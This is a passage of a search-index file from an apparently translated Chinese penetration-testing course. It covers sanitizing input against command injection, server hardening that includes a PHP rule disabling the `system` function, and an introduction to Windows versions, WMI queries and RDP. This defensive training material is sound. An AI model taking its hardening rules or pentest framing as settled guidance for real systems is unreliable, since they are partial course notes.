<p>\u5728\u6211\u4eec\u7684\u793a\u4f8b\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u5f53\u6211\u4eec\u5904\u7406\u5b57\u7b26\u548c\u547d\u4ee4\u8fc7\u6ee4\u5668\u65f6\uff0c\u5b83\u4f1a\u5c06\u67d0\u4e9b\u5355\u8bcd\u5217\u5165\u9ed1\u540d\u5355\u5e76\u5728\u7528\u6237\u8f93\u5165\u4e2d\u67e5\u627e\u5b83\u4eec\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e0d\u662f\u9632\u6b62\u6ce8\u5165\u7684\u597d\u65b9\u6cd5\uff0c\u6211\u4eec\u5e94\u8be5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u6765\u5220\u9664\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>preg_replace</code> \u4ece\u7528\u6237\u8f93\u5165\u4e2d\u5220\u9664\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);\n</code></pre> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u4e0a\u8ff0\u6b63\u5219\u8868\u8fbe\u5f0f\u4ec5\u5141\u8bb8\u5b57\u6bcd\u6570\u5b57\u5b57\u7b26 (<code>A-Za-z0-9</code>) \u5e76\u5141\u8bb8 IP \u6240\u9700\u7684\u70b9\u5b57\u7b26 (<code>.</code>)\u3002\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\u5c06\u4ece\u5b57\u7b26\u4e32\u4e2d\u5220\u9664\u3002\u4f7f\u7528 <code>JavaScript</code> \u4e5f\u53ef\u4ee5\u8fd9\u6837\u505a\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>var ip = ip.replace(/[^A-Za-z0-9.]/g, '');\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c06 DOMPurify \u5e93\u7528\u4e8e <code>NodeJS</code> \u540e\u7aef\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>import DOMPurify from 'dompurify';\nvar ip = DOMPurify.sanitize(ip);\n</code></pre> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u5141\u8bb8\u6240\u6709\u7279\u6b8a\u5b57\u7b26\uff08\u4f8b\u5982\uff0c\u7528\u6237\u8bc4\u8bba\uff09\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0e\u8f93\u5165\u9a8c\u8bc1\u76f8\u540c\u7684 <code>filter_var</code> \u51fd\u6570\uff0c\u5e76\u4f7f\u7528 <code>escapeshellcmd</code> \u8fc7\u6ee4\u5668\u8f6c\u4e49\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u5bfc\u81f4\u4efb\u4f55\u6ce8\u5165.\u5bf9\u4e8e <code>NodeJS</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528 <code>escape(ip)</code> \u51fd\u6570\u3002\u7136\u800c\uff0c\u6b63\u5982\u6211\u4eec\u5728\u672c\u6a21\u5757\u4e2d\u6240\u89c1\uff0c\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u901a\u5e38\u4e0d\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u5b89\u5168\u7684\u505a\u6cd5\uff0c\u56e0\u4e3a\u5b83\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u6280\u672f\u7ed5\u8fc7\u3002</p> <p>\u6709\u5173\u7528\u6237\u8f93\u5165\u9a8c\u8bc1\u548c\u6e05\u7406\u4ee5\u9632\u6b62\u547d\u4ee4\u6ce8\u5165\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u60a8\u53ef\u4ee5\u53c2\u8003\u5b89\u5168\u7f16\u7801 101\uff1aJavaScript \u6a21\u5757\uff0c\u5176\u4e2d\u4ecb\u7ecd\u4e86\u5982\u4f55\u5ba1\u6838 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u4ee5\u8bc6\u522b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u7136\u540e\u6b63\u786e\u4fee\u8865\u8fd9\u4e9b\u6f0f\u6d1e\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_27","title":"\u670d\u52a1\u5668\u914d\u7f6e","text":"<p>\u6700\u540e\uff0c\u6211\u4eec\u5e94\u8be5\u786e\u4fdd\u6211\u4eec\u7684\u540e\u7aef\u670d\u52a1\u5668\u5df2\u5b89\u5168\u914d\u7f6e\uff0c\u4ee5\u51cf\u5c11\u7f51\u7edc\u670d\u52a1\u5668\u906d\u5230\u7834\u574f\u65f6\u7684\u5f71\u54cd\u3002\u6211\u4eec\u53ef\u80fd\u5b9e\u65bd\u7684\u4e00\u4e9b\u914d\u7f6e\u662f\uff1a  - \u4f7f\u7528 Web \u670d\u52a1\u5668\u7684\u5185\u7f6e Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08\u4f8b\u5982\uff0c\u5728 Apache <code>mod_security</code> \u4e2d\uff09\uff0c\u4ee5\u53ca\u5916\u90e8 WAF\uff08\u4f8b\u5982 <code>Cloudflare\u3001Fortinet\u3001Imperva</code> \u7b49\uff09  - \u901a\u8fc7\u4ee5\u4f4e\u6743\u9650\u7528\u6237\uff08\u4f8b\u5982 <code>www-data</code>\uff09\u8fd0\u884c Web \u670d\u52a1\u5668\u6765\u9075\u5b88\u6700\u5c0f\u6743\u9650\u539f\u5219 (PoLP) \u9632\u6b62 Web \u670d\u52a1\u5668\u6267\u884c\u67d0\u4e9b\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u5728 PHP \u4e2d <code>disable_functions=system,...</code>\uff09  - \u5c06 Web \u5e94\u7528\u7a0b\u5e8f\u53ef\u8bbf\u95ee\u7684\u8303\u56f4\u9650\u5236\u5728\u5176\u6587\u4ef6\u5939\u5185\uff08\u4f8b\u5982\u5728 PHP \u4e2d <code>open_basedir = '/var/www/html'</code>\uff09  - \u62d2\u7edd URL \u4e2d\u7684\u53cc\u91cd\u7f16\u7801\u8bf7\u6c42\u548c\u975e ASCII \u5b57\u7b26 </p> <p>\u6700\u540e\uff0c\u5373\u4f7f\u5728\u6240\u6709\u8fd9\u4e9b\u5b89\u5168\u7f13\u89e3\u63aa\u65bd\u548c\u914d\u7f6e\u4e4b\u540e\uff0c\u6211\u4eec\u4ecd\u5fc5\u987b\u6267\u884c\u6211\u4eec\u5728\u672c\u6a21\u5757\u4e2d\u5b66\u5230\u7684\u6e17\u900f\u6d4b\u8bd5\u6280\u672f\uff0c\u4ee5\u67e5\u770b\u662f\u5426\u6709\u4efb\u4f55 Web \u5e94\u7528\u7a0b\u5e8f\u529f\u80fd\u4ecd\u7136\u5bb9\u6613\u53d7\u5230\u547d\u4ee4\u6ce8\u5165\u7684\u653b\u51fb\u3002\u7531\u4e8e\u4e00\u4e9b Web \u5e94\u7528\u7a0b\u5e8f\u6709\u6570\u767e\u4e07\u884c\u4ee3\u7801\uff0c\u4efb\u4f55\u4e00\u884c\u4ee3\u7801\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u9519\u8bef\u90fd\u53ef\u80fd\u8db3\u4ee5\u5f15\u5165\u6f0f\u6d1e\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5fc5\u987b\u901a\u8fc7\u5f7b\u5e95\u7684\u6e17\u900f\u6d4b\u8bd5\u6765\u8865\u5145\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fdd\u62a4 Web \u5e94\u7528\u7a0b\u5e8f\u3002 </p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/","title":"Windows\u7b80\u4ecb","text":""},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#windows","title":"Windows\u7b80\u4ecb","text":"<p>\u4f5c\u4e3a\u4e00\u540d\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\uff0c\u4e86\u89e3\u5404\u79cd\u6280\u672f\u975e\u5e38\u91cd\u8981\u3002\u5168\u9762\u4e86\u89e3 Windows \u548c Linux \u64cd\u4f5c\u7cfb\u7edf\u5bf9\u5404\u79cd\u8bc4\u4f30\u7c7b\u578b\u90fd\u6709\u597d\u5904\u3002\u6211\u4eec\u5728\u8bc4\u4f30\u671f\u95f4\u9047\u5230\u7684\u5927\u591a\u6570\u7cfb\u7edf\uff0c\u65e0\u8bba\u662f\u5728\u672c\u5730\u8fd8\u662f\u5728\u4e91\u4e2d\uff0c\u90fd\u5c06\u57fa\u4e8e\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u3002\u4e86\u89e3\u5982\u4f55\u653b\u51fb\u548c\u9632\u5fa1\u8fd9\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u4ee5\u53ca\u5982\u4f55\u5c06\u5b83\u4eec\u7528\u4f5c\u6267\u884c\u8fdb\u4e00\u6b65\u6e17\u900f\u6d4b\u8bd5\u6d3b\u52a8\u7684\u5e73\u53f0\u975e\u5e38\u91cd\u8981\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#_1","title":"\u89c6\u7a97\u64cd\u4f5c\u7cfb\u7edf","text":"<p>\u5fae\u8f6f\u4e8e 1985 \u5e74 11 \u6708 20 \u65e5\u9996\u6b21\u63a8\u51fa Windows \u64cd\u4f5c\u7cfb\u7edf\u3002Windows \u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u662f MS-DOS \u7684\u56fe\u5f62\u64cd\u4f5c\u7cfb\u7edf\u5916\u58f3\u3002\u66f4\u9ad8\u7248\u672c\u7684 Windows \u684c\u9762\u5f15\u5165\u4e86 Windows \u6587\u4ef6\u7ba1\u7406\u5668\u3001\u7a0b\u5e8f\u7ba1\u7406\u5668\u548c\u6253\u5370\u7ba1\u7406\u5668\u7a0b\u5e8f\u3002</p> <p>Windows 95 \u662f Windows \u548c DOS \u7684\u7b2c\u4e00\u4e2a\u5b8c\u5168\u96c6\u6210\uff0c\u5e76\u9996\u6b21\u63d0\u4f9b\u4e86\u5185\u7f6e\u7684 Internet \u652f\u6301\u3002\u8be5\u7248\u672c\u8fd8\u9996\u6b21\u63a8\u51fa\u4e86 Internet Explorer \u7f51\u7edc\u6d4f\u89c8\u5668\u3002\u4ece\u6700\u521d\u7684\u7248\u672c\u5f00\u59cb\uff0c\u5df2\u7ecf\u53d1\u5e03\u4e86\u5341\u51e0\u4e2a\u7248\u672c\u7684 Windows\uff0c\u4f8b\u5982 Windows XP\u3001Vista \u548c 8\uff0c\u76f4\u5230\u5f53\u524d\u7248\u672c\uff1aWindows 10\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u5fae\u8f6f\u4e3a\u6bcf\u4e2a Windows \u684c\u9762\u7248\u672c\u63d0\u4f9b\u4e86\u5404\u79cd\u7248\u672c\uff0c\u4ee5\u6ee1\u8db3\u4ece\u666e\u901a\u6d88\u8d39\u8005\u5230\u4f01\u4e1a\u5ba2\u6237\u3002</p> <p>Windows Server \u4e8e 1993 \u5e74\u968f\u7740 Windows NT 3.1 Advanced Server \u7684\u53d1\u5e03\u800c\u9996\u6b21\u53d1\u5e03\u3002\u591a\u5e74\u6765\uff0cWindows NT \u8fdb\u884c\u4e86\u591a\u6b21\u66f4\u65b0\uff0c\u6dfb\u52a0\u4e86\u8bf8\u5982 Internet \u4fe1\u606f\u670d\u52a1 (IIS)\u3001\u5404\u79cd\u7f51\u7edc\u534f\u8bae\u3001\u7ba1\u7406\u5411\u5bfc\u4ee5\u4fc3\u8fdb\u7ba1\u7406\u4efb\u52a1\u7b49\u6280\u672f\u3002\u968f\u7740 Windows 2000 \u7684\u53d1\u5e03\uff0cMicrosoft \u63a8\u51fa\u4e86 Active Directory\uff0c\u6700\u521d\u65e8\u5728\u5e2e\u52a9\u7cfb\u7edf\u7ba1\u7406\u5458\u8bbe\u7f6e\u6587\u4ef6\u5171\u4eab\u3001\u6570\u636e\u52a0\u5bc6\u3001VPN \u7b49\u3002Windows Server 2000 \u8fd8\u5305\u62ec Microsoft \u7ba1\u7406\u63a7\u5236\u53f0 (MMC) \u5e76\u652f\u6301\u52a8\u6001\u78c1\u76d8\u5377\u3002</p> <p>\u63a5\u4e0b\u6765\u662f Windows Server 2003\uff0c\u5b83\u5e26\u6709\u670d\u52a1\u5668\u89d2\u8272\u3001\u5185\u7f6e\u9632\u706b\u5899\u3001\u5377\u5f71\u590d\u5236\u670d\u52a1\u7b49\u3002Windows Server 2008 \u5305\u62ec\u6545\u969c\u8f6c\u79fb\u7fa4\u96c6\u3001Hyper-V \u865a\u62df\u5316\u8f6f\u4ef6\u3001\u670d\u52a1\u5668\u6838\u5fc3\u3001\u4e8b\u4ef6\u67e5\u770b\u5668\u4ee5\u53ca\u5bf9 Active Directory \u7684\u4e3b\u8981\u589e\u5f3a\u3002\u591a\u5e74\u6765\uff0cMicrosoft \u53d1\u5e03\u4e86\u66f4\u591a\u670d\u52a1\u5668\u7248\u672c\uff0c\u5305\u62ec Server 2012\u3001Server 2016 \u4ee5\u53ca\u6700\u8fd1\u7684 Server 2019\u3002\u8fd9\u4e2a\u6700\u65b0\u7248\u672c\u589e\u52a0\u4e86\u5bf9 Kubernetes\u3001Linux \u5bb9\u5668\u548c\u66f4\u9ad8\u7ea7\u5b89\u5168\u529f\u80fd\u7684\u652f\u6301\u3002</p> <p>\u968f\u7740\u65b0\u7248\u672c Windows \u7684\u63a8\u51fa\uff0c\u65e7\u7248\u672c\u5df2\u88ab\u5f03\u7528\u5e76\u4e14\u4e0d\u518d\u63a5\u6536 Microsoft \u66f4\u65b0\uff08\u9664\u975e\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u8d2d\u4e70\u4e86\u957f\u671f\u652f\u6301\u5408\u540c\uff09\u3002Windows Server 2008 \u548c 2012 \u7684\u5b89\u5168\u66f4\u65b0\u5df2\u4e8e 2020 \u5e74 1 \u6708 14 \u65e5\u7ec8\u6b62\u3002\u76ee\u524d\uff0c\u4ec5\u652f\u6301 Server 2012 R2 \u53ca\u66f4\u9ad8\u7248\u672c\u3002\u7136\u800c\uff0c\u7531\u4e8e\u53d1\u73b0\u4e86\u5173\u952e\u7684 SMBv1 \u6f0f\u6d1e (EternalBlue)\uff0c\u5fae\u8f6f\u5728\u8fc7\u53bb\u51e0\u5e74\u4e2d\u4e3a\u65e9\u671f\u7248\u672c\u7684 Windows \u53d1\u5e03\u4e86\u5e26\u5916\u8865\u4e01\u3002</p> <p>\u8bb8\u591a\u7248\u672c\u7684 Windows \u73b0\u5728\u88ab\u89c6\u4e3a\u201c\u65e7\u7248\u201d\uff0c\u4e0d\u518d\u53d7\u652f\u6301\u3002\u7ec4\u7ec7\u7ecf\u5e38\u53d1\u73b0\u81ea\u5df1\u8fd0\u884c\u5404\u79cd\u8f83\u65e7\u7684\u64cd\u4f5c\u7cfb\u7edf\u6765\u652f\u6301\u5173\u952e\u5e94\u7528\u7a0b\u5e8f\u6216\u51fa\u4e8e\u8fd0\u8425\u6216\u9884\u7b97\u95ee\u9898\u3002\u8bc4\u4f30\u5458\u9700\u8981\u4e86\u89e3\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02\u4ee5\u53ca\u6bcf\u4e2a\u7248\u672c\u56fa\u6709\u7684\u5404\u79cd\u9519\u8bef\u914d\u7f6e\u548c\u6f0f\u6d1e\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#windows_1","title":"Windows \u7248\u672c","text":"<p>\u4ee5\u4e0b\u662f\u4e3b\u8981 Windows \u64cd\u4f5c\u7cfb\u7edf\u548c\u76f8\u5173\u7248\u672c\u53f7\u7684\u5217\u8868\uff1a \u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0 | \u7248\u672c\u53f7 --- | --- \u89c6\u7a97 NT 4 | 4.0 \u89c6\u7a97 2000 | 5.0 \u89c6\u7a97 | 5.1 \u89c6\u7a97\u670d\u52a1\u5668 2003\u30012003 R2 | 5.2 Windows Vista\uff0c\u670d\u52a1\u5668 2008 | 6.0 Windows 7\u3001\u670d\u52a1\u5668 2008 R2 | 6.1 \u89c6\u7a97 8\u3001\u670d\u52a1\u5668 2012 | 6.2 Windows 8.1\u3001\u670d\u52a1\u5668 2012 R2 | 6.3 Windows 10\u3001\u670d\u52a1\u5668 2016\u3001\u670d\u52a1\u5668 2019 | 10.0</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Get-WmiObject cmdlet\u6765\u67e5\u627e\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u6b64 cmdlet \u53ef\u7528\u4e8e\u83b7\u53d6 WMI \u7c7b\u7684\u5b9e\u4f8b\u6216\u6709\u5173\u53ef\u7528 WMI \u7c7b\u7684\u4fe1\u606f\u3002\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u627e\u5230\u6211\u4eec\u7cfb\u7edf\u7684\u7248\u672c\u548c\u5185\u90e8\u7248\u672c\u53f7\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u7c7b\u8f7b\u677e\u83b7\u53d6\u6b64\u4fe1\u606f<code>win32_OperatingSystem</code>\uff0c\u8fd9\u8868\u660e\u6211\u4eec\u5728 Windows 10 \u4e3b\u673a\u4e0a\uff0c\u5185\u90e8\u7248\u672c\u53f7\u4e3a 19041\u3002</p> <pre><code>PS C:\\htb&gt; Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber\n\nVersion    BuildNumber\n-------    -----------\n10.0.19041 19041\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u7684\u5176\u4ed6\u4e00\u4e9b\u6709\u7528\u7684\u7c7b<code>Get-WmiObject</code>\u662f<code>Win32_Process</code>\u83b7\u53d6\u8fdb\u7a0b\u5217\u8868\uff0c<code>Win32_Service</code>\u83b7\u53d6\u670d\u52a1\u5217\u8868<code>Win32_Bios</code>\u4ee5\u83b7\u53d6 BIOS \u4fe1\u606f\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5<code>ComputerName</code>\u53c2\u6570\u6765\u83b7\u53d6\u6709\u5173\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u4fe1\u606f\u3002<code>GetWmiObject</code>\u53ef\u7528\u4e8e\u542f\u52a8\u548c\u505c\u6b62\u672c\u5730\u548c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684\u670d\u52a1\u7b49\u7b49\u3002\u53ef\u4ee5\u5728\u6b64\u5904\u548c\u6b64\u5904\u627e\u5230\u6709\u5173 cmdlet \u7684\u66f4\u591a\u4fe1\u606f\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#accessing-windows","title":"Accessing Windows","text":""},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#_2","title":"\u672c\u5730\u8bbf\u95ee\u6982\u5ff5","text":"<p>\u5982\u679c\u60a8\u73b0\u5728\u6b63\u5728\u9605\u8bfb\u8fd9\u4e9b\u6587\u5b57\uff0c\u90a3\u4e48\u60a8\u53ef\u4ee5\u5728\u672c\u5730\u8bbf\u95ee\u67d0\u79cd\u8ba1\u7b97\u673a\u3002\u65e0\u8bba\u662f\u667a\u80fd\u624b\u673a\u3001\u5e73\u677f\u7535\u8111\u3001\u7b14\u8bb0\u672c\u7535\u8111\u3001Raspberry Pi \u8fd8\u662f\u53f0\u5f0f\u673a\u3002\u672c\u5730\u8bbf\u95ee\u662f\u8bbf\u95ee\u4efb\u4f55\u8ba1\u7b97\u673a\uff08\u5305\u62ec\u8fd0\u884c Windows \u7684\u8ba1\u7b97\u673a\uff09\u7684\u6700\u5e38\u89c1\u65b9\u5f0f\u3002<code>Input</code>\u53ef\u80fd\u901a\u8fc7\u952e\u76d8\u3001\u89e6\u63a7\u677f\u548c/\u6216\u9f20\u6807\u53d1\u751f\u3002<code>Output</code>\u6765\u81ea\u663e\u793a\u5c4f\u3002\u62e5\u6709\u5458\u5de5\u65e5\u5e38\u5de5\u4f5c\u7684\u529e\u516c\u7a7a\u95f4\u7684\u7ec4\u7ec7\u56f4\u7ed5\u5176\u5458\u5de5\u5728\u7ec4\u7ec7\u62e5\u6709\u7684\u8ba1\u7b97\u673a\u4e0a\u7684\u4e13\u7528\u5de5\u4f5c\u7a7a\u95f4\u4e2d\u5de5\u4f5c\u7684\u60f3\u6cd5\u6784\u5efa\u5b89\u5168\u7b56\u7565\u548c\u5b89\u5168\u63a7\u5236\u3002\u8d8a\u6765\u8d8a\u591a\u7684\u7ec4\u7ec7\u901a\u8fc7\u975e\u6280\u672f\u548c\u6280\u672f\u4eba\u5458\u589e\u52a0\u5bf9\u8fdc\u7a0b\u5de5\u4f5c\u7684\u652f\u6301\u3002\u5bf9\u4e8e\u5728 IT\u3001\u8f6f\u4ef6\u5f00\u53d1\u548c\u4fe1\u606f\u5b89\u5168\u9886\u57df\u5de5\u4f5c\u7684\u6280\u672f\u4e13\u4e1a\u4eba\u58eb\u6765\u8bf4\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u65b0\u7684\u73b0\u5b9e\u3002\u5728\u4efb\u4f55\u4e00\u5929\uff0c\u6280\u672f\u4e13\u4e1a\u4eba\u5458\u90fd\u53ef\u4ee5\u5728\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\u591a\u53f0\u673a\u5668\u3002\u6709\u4e86\u8fd9\u4e2a\uff0c\u8ba9\u6211\u4eec\u8ba8\u8bba\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6982\u5ff5\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#_3","title":"\u8fdc\u7a0b\u8bbf\u95ee\u6982\u5ff5","text":"<p>\u8fdc\u7a0b\u8bbf\u95ee\u662f\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002\u5728\u8fdc\u7a0b\u8bbf\u95ee\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e4b\u524d\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u672c\u5730\u8bbf\u95ee\u3002\u8fdc\u7a0b\u8bbf\u95ee\u6709\u65e0\u6570\u79cd\u65b9\u6cd5\u3002\u5728\u672c\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u5c06\u4e3b\u8981\u4f7f\u7528\u8fdc\u7a0b\u8bbf\u95ee\u65b9\u6cd5\u6765\u8fde\u63a5 Windows \u64cd\u4f5c\u7cfb\u7edf\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u6280\u672f\u7684\u8fdb\u6b65\u50ac\u751f\u4e86\u5b8c\u5168\u4f9d\u8d56\u8fdc\u7a0b\u8bbf\u95ee\u548c\u8fdc\u7a0b\u7ba1\u7406\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6574\u4e2a\u884c\u4e1a\u3002</p> <p>\u8003\u8651MSP\u548cMSSP\uff0c\u8fd9\u4e24\u4e2a\u884c\u4e1a\u90fd\u4e3b\u8981\u4f9d\u8d56\u4e8e\u8fdc\u7a0b\u7ba1\u7406\u5176\u5ba2\u6237\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u3002\u6b64\u529f\u80fd\u4f7f\u4ed6\u4eec\u80fd\u591f\u96c6\u4e2d\u7ba1\u7406\u3001\u6807\u51c6\u5316\u6240\u4f7f\u7528\u7684\u6280\u672f\u3001\u81ea\u52a8\u5316\u4f17\u591a\u4efb\u52a1\u3001\u542f\u7528\u8fdc\u7a0b\u5de5\u4f5c\u5b89\u6392\u5e76\u5141\u8bb8\u5728\u95ee\u9898\u6d6e\u51fa\u6c34\u9762\u6216\u51fa\u73b0\u6f5c\u5728\u5b89\u5168\u5a01\u80c1\u65f6\u5feb\u901f\u54cd\u5e94\u3002\u8fdc\u7a0b\u8bbf\u95ee\u4e0d\u4ec5\u9650\u4e8e MSP \u548c MSSP\u3002\u62e5\u6709 IT\u3001\u8f6f\u4ef6\u5f00\u53d1\u548c/\u6216\u5b89\u5168\u56e2\u961f\u7684\u7ec4\u7ec7\u6bcf\u5929\u90fd\u4f7f\u7528\u8fdc\u7a0b\u8bbf\u95ee\u65b9\u6cd5\u6765\u6784\u5efa\u5e94\u7528\u7a0b\u5e8f\u3001\u7ba1\u7406\u670d\u52a1\u5668\u548c\u7ba1\u7406\u5458\u5de5\u5de5\u4f5c\u7ad9\u3002\u4e00\u4e9b\u6700\u5e38\u89c1\u7684\u8fdc\u7a0b\u8bbf\u95ee\u6280\u672f\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u865a\u62df\u4e13\u7528\u7f51\u7edc (VPN)</li> <li>\u5b89\u5168\u5916\u58f3 (SSH)</li> <li>\u6587\u4ef6\u4f20\u8f93\u534f\u8bae (FTP)</li> <li>\u865a\u62df\u7f51\u7edc\u8ba1\u7b97 (VNC)</li> <li>Windows \u8fdc\u7a0b\u7ba1\u7406\uff08\u6216 PowerShell \u8fdc\u7a0b\u5904\u7406\uff09(WinRM)</li> <li>\u8fdc\u7a0b\u684c\u9762\u534f\u8bae (RDP)</li> </ul> <p>\u6211\u4eec\u5c06\u4e3b\u8981\u5173\u6ce8\u5728\u672c\u6a21\u5757\u4e2d\u4f7f\u7528 RDP\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#rdp","title":"\u8fdc\u7a0b\u684c\u9762\u534f\u8bae (RDP)","text":"<p>RDP \u4f7f\u7528\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u67b6\u6784\uff0c\u5176\u4e2d\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u7528\u4e8e\u901a\u8fc7\u542f\u7528 RDP \u8bbf\u95ee\u7684\u7f51\u7edc\u6307\u5b9a\u8ba1\u7b97\u673a\u7684\u76ee\u6807 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002\u542f\u7528 RDP \u8fdc\u7a0b\u8bbf\u95ee\u7684\u76ee\u6807\u8ba1\u7b97\u673a\u88ab\u89c6\u4e3a\u670d\u52a1\u5668\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cRDP \u9ed8\u8ba4\u4fa6\u542c\u903b\u8f91\u7aef\u53e3<code>3389</code>\u3002\u8bf7\u8bb0\u4f4f\uff0cIP \u5730\u5740\u7528\u4f5c\u7f51\u7edc\u4e0a\u8ba1\u7b97\u673a\u7684\u903b\u8f91\u6807\u8bc6\u7b26\uff0c\u800c\u903b\u8f91\u7aef\u53e3\u662f\u5206\u914d\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6807\u8bc6\u7b26\u3002\u7b80\u5355\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u7f51\u7edc\u5b50\u7f51\u89c6\u4e3a\u57ce\u9547\u4e2d\u7684\u8857\u9053\uff08\u516c\u53f8\u7f51\u7edc\uff09\uff0c\u5c06\u8be5\u5b50\u7f51\u4e2d\u7684 IP \u5730\u5740\u5206\u914d\u7ed9\u4f5c\u4e3a\u8be5\u8857\u9053\u4e0a\u7684\u623f\u5c4b\u7684\u4e3b\u673a\uff0c\u5e76\u5c06\u903b\u8f91\u7aef\u53e3\u89c6\u4e3a\u53ef\u7528\u4e8e\u8fdb\u5165\u623f\u5b50\u3002</p> <p>\u4e00\u65e6\u8bf7\u6c42\uff08\u5c01\u88c5\u5728\u6570\u636e\u5305\u4e2d\uff09\u901a\u8fc7\u5176 IP \u5730\u5740\u5230\u8fbe\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u8be5\u8bf7\u6c42\u5c06\u6839\u636e\u8be5\u8bf7\u6c42\u4e2d\u6307\u5b9a\u7684\u7aef\u53e3\uff08\u4f5c\u4e3a\u6570\u636e\u5305\u5185\u7684\u6807\u5934\u5305\u542b\uff09\u5b9a\u5411\u5230\u8ba1\u7b97\u673a\u4e0a\u6258\u7ba1\u7684\u5e94\u7528\u7a0b\u5e8f\u3002IP \u5bfb\u5740\u548c\u534f\u8bae\u5c01\u88c5\u5728\u7f51\u7edc\u7b80\u4ecb\u6a21\u5757\u4e2d\u6709\u66f4\u8be6\u7ec6\u7684\u4ecb\u7ecd\u3002\u4ece\u7f51\u7edc\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5728\u672c\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e86\u89e3\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u5206\u914d\u4e86\u4e00\u4e2a IP 